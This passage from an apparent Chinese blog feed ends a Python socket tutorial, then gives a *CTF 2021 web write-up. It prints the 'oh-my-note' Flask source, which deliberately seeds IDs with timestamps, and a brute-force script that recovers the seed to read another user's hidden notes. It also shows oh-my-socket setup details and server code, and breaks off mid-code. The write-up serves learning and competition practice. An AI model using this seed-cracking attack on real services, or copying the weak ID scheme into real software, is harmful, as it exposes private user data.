class="subst">&#123;addr&#125;</span>&#x27;</span>)</span><br><span class="line">    print(count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    message = <span class="string">&#x27;Hello world, socket!&#x27;</span></span><br><span class="line">    client_socket.send(</span><br><span class="line">        message.encode(<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每次连接之后都会输出对方的 IP 和端口，这样就能比较清晰的观察端口的变化。</p><p>client端（未绑定固定的端口）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket对象</span></span><br><span class="line">s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取本机名，设置端口号</span></span><br><span class="line">hostname = socket.gethostname()</span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到服务</span></span><br><span class="line">s.connect(</span><br><span class="line">    (hostname, port)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接受消息</span></span><br><span class="line">message = s.recv(<span class="number">1024</span>)</span><br><span class="line">print(message.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先启动server端，然后启动client端，就可以看到client端回显下面的字母：Hello world, socket!</p><p>多次运行之后就能清楚的发现client.py的端口在发生变化，说明其端口是由系统自动分配的。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/BB0A8DF5-6EBA-4ED7-88C8-6F69100864CC.png"></p><p>可以考虑手动绑定端口，让ip的端口固定为自己想要的端口，在 connect 之前执行如下代码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">s.bind(</span><br><span class="line">    (hostname, <span class="number">59446</span>)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket对象</span></span><br><span class="line">s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取本机名，设置端口号</span></span><br><span class="line">hostname = socket.gethostname()</span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到服务</span></span><br><span class="line">s.bind(</span><br><span class="line">    (hostname, <span class="number">59446</span>)</span><br><span class="line">)</span><br><span class="line">s.connect(</span><br><span class="line">    (hostname, port)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接受消息</span></span><br><span class="line">message = s.recv(<span class="number">1024</span>)</span><br><span class="line">print(message.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现自己手动绑定端口之后，端口固定不变<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/124FE048-BAFF-46AE-ABD2-4B3181C54DFF.png"></p><p>结果正如上文所说，如果不绑定端口，系统则会自动分配端口。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考教程：</p><ol><li>Python3 网络编程：<a href="https://www.runoob.com/python3/python3-socket.html">https://www.runoob.com/python3/python3-socket.html</a></li><li>网络编程socket之bind函数：<a href="https://blog.csdn.net/dongliqiang2006/article/details/5824651">https://blog.csdn.net/dongliqiang2006/article/details/5824651</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现*CTF题解</title>
      <link href="a310fa11aabc/"/>
      <url>a310fa11aabc/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Web"><a href="#1-Web" class="headerlink" title="1 Web"></a>1 Web</h1><p>由于期末考试和各种课设，有一段时间没有比赛了，做题时没有思路，感觉好菜呐～🤒</p><h2 id="1-1-oh-my-note"><a href="#1-1-oh-my-note" class="headerlink" title="1.1 oh-my-note"></a>1.1 oh-my-note</h2><p>题目中给出源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, redirect, url_for, request, session, Flask</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> exts <span class="keyword">import</span> db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> User, Note</span><br><span class="line"><span class="keyword">from</span> forms <span class="keyword">import</span> CreateNoteForm</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(Config)</span><br><span class="line">db.init_app(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆判断</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_required</span>(<span class="params">f</span>):</span></span><br><span class="line"><span class="meta">    @wraps(f)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorated_function</span>(<span class="params">*args, **kws</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;username&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> f(*args, **kws)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorated_function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位随机的id</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_id</span>():</span></span><br><span class="line">    alphabet = list(string.ascii_lowercase + string.digits)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首页</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="comment"># 查询前 100 个非私有的 note</span></span><br><span class="line">    results = Note.query.filter_by(prv=<span class="string">&#x27;False&#x27;</span>).limit(<span class="number">100</span>).all()</span><br><span class="line">    notes = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">        note = &#123;&#125;</span><br><span class="line">        note[<span class="string">&#x27;title&#x27;</span>] = x.title</span><br><span class="line">        note[<span class="string">&#x27;note_id&#x27;</span>] = x.note_id</span><br><span class="line">        notes.append(note)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, notes=notes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出当前用户</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/logout&#x27;)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建note</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/create_note&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_note</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        form = CreateNoteForm()</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            username = form.username.data</span><br><span class="line">            title = form.title.data</span><br><span class="line">            text = form.body.data</span><br><span class="line">            prv = str(form.private.data)</span><br><span class="line">            <span class="comment"># 在数据库中查询是否有这个用户名</span></span><br><span class="line">            user = User.query.filter_by(username=username).first()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> user:</span><br><span class="line">                user_id = user.user_id</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 使用时间戳生成用户的id</span></span><br><span class="line">                timestamp = round(time.time(), <span class="number">4</span>)</span><br><span class="line">                random.seed(timestamp)</span><br><span class="line">                user_id = get_random_id()</span><br><span class="line">                user = User(username=username, user_id=user_id)</span><br><span class="line">                db.session.add(user)</span><br><span class="line">                db.session.commit()</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line"></span><br><span class="line">            timestamp = round(time.time(), <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">            post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(</span><br><span class="line">                <span class="string">&#x27;%Y-%m-%d %H:%M UTC&#x27;</span>)</span><br><span class="line">            <span class="comment"># 使用「用户id」+「时间戳」生成「文章id」</span></span><br><span class="line">            random.seed(user_id + post_at)</span><br><span class="line">            note_id = get_random_id()</span><br><span class="line"></span><br><span class="line">            note = Note(user_id=user_id, note_id=note_id,</span><br><span class="line">                        title=title, text=text,</span><br><span class="line">                        prv=prv, post_at=post_at)</span><br><span class="line">            db.session.add(note)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;create.html&quot;</span>, form=form)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询自己的note。flag可能在note中，需要爆破种子得到user_id来查询文章</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/my_notes&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_notes</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        user_id = User.query.filter_by(username=username).first().user_id</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user_id = request.args.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user_id:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    results = Note.query.filter_by(user_id=user_id).limit(<span class="number">100</span>).all()</span><br><span class="line">    notes = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">        note = &#123;&#125;</span><br><span class="line">        note[<span class="string">&#x27;title&#x27;</span>] = x.title</span><br><span class="line">        note[<span class="string">&#x27;note_id&#x27;</span>] = x.note_id</span><br><span class="line">        notes.append(note)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;my_notes.html&quot;</span>, notes=notes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看note，id动态参数</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/view/&lt;_id&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">_id</span>):</span></span><br><span class="line">    <span class="comment"># SQLAlchemy 的方法，查询 note</span></span><br><span class="line">    note = Note.query.filter_by(note_id=_id).first()</span><br><span class="line">    <span class="comment"># 通过note的id获取用户id，用户id再获取用户名</span></span><br><span class="line">    user_id = note.user_id</span><br><span class="line">    username = User.query.filter_by(user_id=user_id).first().username</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;post_at&#x27;</span>: note.post_at,</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: note.title,</span><br><span class="line">        <span class="string">&#x27;text&#x27;</span>: note.text,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># json传入模版</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;note.html&#x27;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目中使用 flask 框架。session 并没有给出 security key，所以并不是伪造 session。使用 render_template 而不是使用 render_template_string，所以也无法使用模版注入。</p><p>队里的师傅说是随机数问题，以前没做过这类的题目。最相似的题目就是 DDCTF 的礼品商店，先伪造 session，然后访问已知的 flag 页面。</p><p>这个题目并没有明确的表明 flag 的位置，让我有些迷惑。</p><p>以前没有做过类似的随机数爆破的题目，还挺害怕的，慢慢拆解过后也不过如此。</p><p>大致步骤：猜测 flag 的位置在 note 中，需要伪造 user_id，通过代码审计可知 user_id 和 note_id 都是采用时间来作为种子，只需要找到第一篇 note_id，就可以反向推导出种子，从而得到 user_id。</p><p>所以就可以写出如下的 Payload：（源于博客<a href="https://blog.frankli.site/2021/01/18/*CTF-2021-Web/">*CTF 2021 Web部分 Writeup</a>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始时间：2021-01-15 10:29:00</span></span><br><span class="line">ts = <span class="number">1610677740</span></span><br><span class="line"><span class="comment"># 结束时间：2021-01-15 10:30:00</span></span><br><span class="line">te = <span class="number">1610677800</span></span><br><span class="line"><span class="comment"># 题目中生成的随机数</span></span><br><span class="line">target = <span class="string">&#x27;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_id</span>():</span></span><br><span class="line">    alphabet = list(string.ascii_lowercase + string.digits)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(ts, te):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999</span>):</span><br><span class="line">        <span class="comment"># 逐个时间戳进行遍历，并且播撒种子</span></span><br><span class="line">        timestamp = <span class="number">0.0001</span> * i + t</span><br><span class="line">        random.seed(timestamp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 利用种子生成随机数。根据题目中所给的信息，可以知道user_id的生成方法(文章id和用户id使用同一个时间戳作为种子)。</span></span><br><span class="line">        user = get_random_id()</span><br><span class="line">        time = datetime.datetime.fromtimestamp(</span><br><span class="line">            t, tz=datetime.timezone.utc</span><br><span class="line">        ).strftime(<span class="string">&#x27;%Y-%m-%d %H:%M UTC&#x27;</span>)</span><br><span class="line">        random.seed(user + time)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果随机数相等，那么找到种子</span></span><br><span class="line">        post = get_random_id()</span><br><span class="line">        <span class="keyword">if</span> post == target:</span><br><span class="line">            print(timestamp, user)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-2-oh-my-socket"><a href="#1-2-oh-my-socket" class="headerlink" title="1.2 oh-my-socket"></a>1.2 oh-my-socket</h2><p>题目信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;101.33.124.168:5001&#x2F;upload subnet: 172.21.0.0&#x2F;16 server: 172.21.0.2 client: 172.21.0.3 webserver: 172.21.0.4</span><br><span class="line">http:&#x2F;&#x2F;101.33.124.168:5002&#x2F;upload subnet: 172.22.0.0&#x2F;16 server: 172.22.0.2 client: 172.22.0.3 webserver: 172.22.0.4</span><br><span class="line">http:&#x2F;&#x2F;101.33.124.168:5003&#x2F;upload subnet: 172.23.0.0&#x2F;16 server: 172.23.0.2 client: 172.23.0.3 webserver: 172.23.0.4</span><br><span class="line">http:&#x2F;&#x2F;101.33.124.168:5004&#x2F;upload subnet: 172.24.0.0&#x2F;16 server: 172.24.0.2 client: 172.24.0.3 webserver: 172.24.0.4</span><br><span class="line">http:&#x2F;&#x2F;101.33.124.168:5005&#x2F;upload subnet: 172.25.0.0&#x2F;16 server: 172.25.0.2 client: 172.25.0.3 webserver: 172.25.0.4</span><br><span class="line"></span><br><span class="line">Docker Registry mirrors: http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&#x2F;</span><br><span class="line"></span><br><span class="line">Servers reboot every 2 minutes. All source codes and Docker files provided in the attachment. Try to solve it locally before interacting with the servers.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><del>看到题目就害怕（逃</del></p><p>这个题目让我发现自己自己的不足之处。</p><ol><li>docker-compose</li><li>TCP原理</li></ol><p>上次面试 Gcow 就被提问到 TCP 三次握手，已经忘得差不多了，后面需要慢慢补充一下计算机网络相关的知识。</p><p>最初看到 oh-my-socket 文件时，虽然能很直观的看出来这是一个 docker 的文件，但是并不太清楚这个如何使用。</p><p>根据题解的表述「在本地尝试」，下面图片中的内容是 server/server/oh-some-funny-code 中的 flag。所以复现的第一步是需要了解清楚如何将这个文件夹的内容运行在本地。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E21BD71E-53A1-4D38-B87D-F21D1F5CD111.png"></p><p>先在我的黑果上测试启动服务，但是发现并不能启动，给出了如下的错误信息。</p><blockquote><p>TypeError: unsupported operand type(s) for -=: ‘Retry’ and ‘int’<br>ERROR: Service ‘client’ failed to build : The command ‘/bin/sh -c apt-get update &amp;&amp;     apt-get -y upgrade &amp;&amp;     apt-get install -y iptables &amp;&amp;     apt-get install -y python3 &amp;&amp;     apt-get install -y python3-pip &amp;&amp;     pip3 install -r requirements.txt -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a> &amp;&amp;     chmod a+x start.sh’ returned a non-zero code: 2</p></blockquote><p>在题解中并没有说到启动 docker 时遇到的问题，那说明应该能很正常的启动。</p><p>我又尝试在 kali 中启动 docker-compose，第一次 docker-compose up -d 时依旧报错，但是报错信息并不复杂</p><blockquote><p>TypeError: unsupported operand type(s) for -=: ‘Retry’ and ‘int’<br>You are using pip version 8.1.1, however version 20.3.3 is available.<br>You should consider upgrading via the ‘pip install –upgrade pip’ command.<br>ERROR: Service ‘client’ failed to build: The command ‘/bin/sh -c apt-get update &amp;&amp;     apt-get -y upgrade &amp;&amp;     apt-get install -y iptables &amp;&amp;     apt-get install -y python3 &amp;&amp;     apt-get install -y python3-pip &amp;&amp;     pip3 install -r requirements.txt -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a> &amp;&amp;     chmod a+x start.sh’ returned a non-zero code: 2</p></blockquote><p>大致意思就是我的pip版本有问题，需要更新 pip，安装 pip 并更新后再次使用 <code>docker-compose up -d</code> 就正常启动服务了。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/15BB33B9-1039-455F-9F6E-A15A0EF8D6B3.png"></p><p>后面涉及 Python 的网络编程，需要补充一下 Python 网络编程的基础。参考题解分析 server/server/server.py 文件中的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line">PORT = <span class="number">21587</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录连接数</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 等待连接，每次连接都会导致记录连接数（cnt）加1</span></span><br><span class="line">    print(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    print(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 接收数据</span></span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;*ctf&#x27;</span>:</span><br><span class="line">                content = open(<span class="string">&#x27;oh-some-funny-code&#x27;</span>).read()</span><br><span class="line">                tcpCliSock.send((content.encode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tcpCliSock.send((<span class="string">&#x27;[%s] %s&#x27;</span> % (ctime(), 